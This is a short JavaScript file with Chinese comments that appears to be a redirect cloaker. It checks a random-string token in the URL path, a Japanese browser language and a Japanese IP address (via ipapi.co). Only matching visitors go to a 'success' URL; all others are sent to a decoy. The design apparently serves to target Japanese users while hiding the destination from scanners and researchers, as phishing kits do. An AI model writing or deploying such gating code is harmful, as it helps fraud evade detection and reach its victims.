// 验证链接格式并提取参数
function validateAndExtractParams(url) {
    const regex = /\/caonima=([A-Za-z]+)\.co\.jp\//;
    const match = url.match(regex);
    
    if (match) {
        const randomStr = match[1];
        const validLength = randomStr.length >= 7 && randomStr.length <= 9;
        const hasUpperCase = /[A-Z]/.test(randomStr);
        const hasLowerCase = /[a-z]/.test(randomStr);
        
        return {
            isValid: validLength && hasUpperCase && hasLowerCase,
            randomString: randomStr
        };
    }
    return {
        isValid: false,
        randomString: null
    };
}

// 验证随机字符串
function validateRandomString(str) {
    return /^[A-Za-z]{7,9}$/.test(str);
}

// 检查浏览器语言
function checkBrowserLanguage() {
    const userLang = navigator.language || navigator.userLanguage;
    return userLang.toLowerCase().startsWith('ja'); // 检查是否为日语
}

// 检查IP地区
async function checkIPLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.country === 'JP'; // 检查是否为日本IP
    } catch (error) {
        console.error('IP检查失败:', error);
        return false;
    }
}

// 处理重定向
async function handleRedirect(params) {
    // 检查IP和浏览器语言
    const [isValidIP, isValidLanguage] = await Promise.all([
        checkIPLocation(),
        checkBrowserLanguage()
    ]);

    // 如果IP或语言检查失败,返回失败URL
    if (!isValidIP || !isValidLanguage) {
        console.log('IP或语言验证失败');
        return CONFIG.REDIRECT_URL_FAILURE;
    }

    // 检查URL参数
    if (window.location.pathname.includes('caonima=')) {
        if (params.isValid && validateRandomString(params.randomString)) {
            return CONFIG.REDIRECT_URL_SUCCESS;
        }
    }
    
    return CONFIG.REDIRECT_URL_FAILURE;
}
